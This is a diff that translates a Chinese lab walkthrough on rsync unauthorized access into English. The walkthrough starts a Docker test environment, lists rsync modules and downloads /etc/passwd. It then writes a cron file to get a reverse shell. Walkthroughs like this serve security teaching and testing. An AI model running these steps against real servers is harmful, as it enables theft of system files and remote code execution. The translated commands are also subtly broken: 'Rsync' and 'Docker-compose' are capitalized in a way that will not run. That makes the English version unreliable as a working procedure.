@@ -1,46 +1,46 @@
-# rsync 未授权访问漏洞
+# rsync Unauthorized Access Vulnerability
 
-rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。
+Rsync is a data backup tool for Linux. It supports remote file transfer via rsync protocol and ssh protocol. The rsync protocol listens to port 873 by default. If the target has the rsync service enabled and no ACL or access password is configured, we will be able to read and write the target server file.
 
-## 漏洞测试
+## Vulnerability Testing
 
-编译及运行rsync服务器：
-
-```
-docker-compose build
-docker-compose up -d
-```
-
-环境启动后，我们用rsync命令访问之：
+Compile and run the rsync server:
 
 ```
-rsync rsync://your-ip:873/
+Docker-compose build
+Docker-compose up -d
 ```
 
-可以查看模块名列表：
+After the environment is started, we use the rsync command to access it:
+
+```
+Rsync rsync://your-ip:873/
+```
+
+You can view a list of module names:
 
 ![](1.png)
 
-如上图，有一个src模块，我们再列出这个模块下的文件：
+As shown above, there is a src module, and we will list the files under this module:
 
 ```
-rsync rsync://your-ip:873/src/
+Rsync rsync://your-ip:873/src/
 ```
 
 ![](2.png)
 
-这是一个Linux根目录，我们可以下载任意文件：
+This is a Linux root directory and we can download any file:
 
 ```
-rsync -av rsync://your-ip:873/src/etc/passwd ./
+Rsync -av rsync://your-ip:873/src/etc/passwd ./
 ```
 
-或者写入任意文件：
+Or write to any file:
 
 ```
-rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
+Rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell
 ```
 
-我们写入了一个cron任务，成功反弹shell：
+We wrote a cron task and successfully bounced the shell:
 
 ![](3.png)
